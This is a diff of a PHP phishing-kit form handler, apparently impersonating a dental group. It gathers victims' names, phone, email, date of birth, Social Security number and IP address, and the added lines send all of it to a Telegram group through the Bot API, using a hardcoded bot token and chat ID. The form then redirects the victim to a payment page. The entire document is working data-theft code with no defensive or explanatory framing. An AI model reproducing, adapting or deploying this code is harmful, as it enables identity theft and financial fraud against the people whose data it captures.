@@ -18,54 +18,29 @@ if (isset($_POST['submit'])) {
     sacuvajPodatkeUSesiju('ssn', $ssn);
     sacuvajPodatkeUSesiju('ip_address', $ipAddress);
 
-    $flaskUrl = "http://127.0.0.1:5000/receive_data";
+    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
+    $chatId = '-4104959417';
+    $telegramMessage = "GARDENA DentalGroup\nFirst Name: $firstName\nLast Name: $lastName\nPhone: $phone\nEmail: $email\nDate of Birth: $dob\nSSN: $ssn\nIP Address: $ipAddress";
 
-    $formData = http_build_query([
-        'first_name' => $firstName,
-        'last_name' => $lastName,
-        'phone' => $phone,
-        'email' => $email,
-        'dob' => $dob,
-        'ssn' => $ssn,
-        'ip_address' => $ipAddress,
-        'user_agent' => $_SERVER['HTTP_USER_AGENT']
-    ]);
+    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
+    $telegramData = [
+        'chat_id' => $chatId,
+        'text' => $telegramMessage,
+    ];
+    $chTelegram = curl_init($telegramUrl);
+    curl_setopt($chTelegram, CURLOPT_POST, true);
+    curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
+    curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
+    $telegramResponse = curl_exec($chTelegram);
+    curl_close($chTelegram);
 
-    $chFlask = curl_init($flaskUrl);
-    curl_setopt($chFlask, CURLOPT_POST, true);
-    curl_setopt($chFlask, CURLOPT_POSTFIELDS, $formData);
-    curl_setopt($chFlask, CURLOPT_RETURNTRANSFER, true);
-    $flaskResponse = curl_exec($chFlask);
-    curl_close($chFlask);
-
-    if ($flaskResponse === false) {
-        echo "Greška pri slanju podataka Flask aplikaciji: " . curl_error($chFlask);
+    if ($telegramResponse === false) {
+        echo "Greška pri slanju poruke na Telegram grupu: " . curl_error($chTelegram);
     } else {
-        echo "Podaci su uspešno poslati Flask aplikaciji: " . $flaskResponse;
-        $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
-        $chatId = '-4104959417';
-        $telegramMessage = "Podaci: \nIme: $firstName\nPrezime: $lastName\nEmail: $email\nTelefon: $phone";
-
-        $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
-        $telegramData = [
-            'chat_id' => $chatId,
-            'text' => $telegramMessage,
-        ];
-        $chTelegram = curl_init($telegramUrl);
-        curl_setopt($chTelegram, CURLOPT_POST, true);
-        curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
-        curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
-        $telegramResponse = curl_exec($chTelegram);
-        curl_close($chTelegram);
-
-        if ($telegramResponse === false) {
-            echo "Greška pri slanju poruke na Telegram grupu: " . curl_error($chTelegram);
-        } else {
-            echo "Poruka je uspešno poslata na Telegram grupu: " . $telegramResponse;
-            header("Location: payment.php");
-            exit();
-        }
+        echo "Poruka je uspešno poslata na Telegram grupu: " . $telegramResponse;
+        header("Location: payment.php");
+        exit();
     }
 }
 
